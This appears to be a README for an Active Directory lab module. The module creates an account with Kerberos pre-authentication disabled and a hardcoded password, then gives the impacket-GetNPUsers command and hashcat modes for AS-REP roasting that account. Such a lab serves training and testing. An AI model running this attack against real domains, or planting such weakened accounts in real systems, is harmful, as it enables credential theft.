# asrep-roast

Creates `asrep_user` (password `Aa1234567890!`) in `CN=Users` with Kerberos pre-authentication disabled.

Attack:

    impacket-GetNPUsers <domain>/ -dc-ip <dc ip> -usersfile users.txt -format hashcat

Hash: `$krb5asrep$`, hashcat mode 18200 (RC4) or 32100 (AES).

Disable removes the account.
